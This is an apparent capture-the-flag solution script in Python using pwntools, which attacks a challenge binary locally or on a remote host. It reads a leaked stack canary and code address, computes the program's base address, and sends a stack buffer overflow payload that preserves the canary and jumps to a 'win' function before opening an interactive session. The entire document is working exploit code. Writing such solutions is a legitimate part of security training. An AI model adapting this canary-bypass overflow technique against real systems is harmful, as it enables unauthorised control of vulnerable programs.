#!/usr/bin/env python3
from pwn import *
import sys

FILENAME = "./src/chal"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)

if len(sys.argv) == 1:
    r = process(FILENAME)
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

r.recvuntil(b"Security stamp: 0x")
canary = int(r.recvuntil(b"\n", drop=True), 16)
r.recvuntil(b"Map pin: ")
init = int(r.recvuntil(b"\n", drop=True), 16)

exe.address = init - exe.symbols["init"]
win = exe.symbols["win"]
rop = ROP(exe)
ret = rop.find_gadget(["ret"]).address

log.info("canary: " + hex(canary))
log.info("init: " + hex(init))
log.info("win: " + hex(win))

payload = b"A" * 72 + p64(canary) + b"B" * 8 + p64(ret) + p64(win)

r.recvuntil(b"Input your data: ")
r.sendline(payload)

r.interactive()
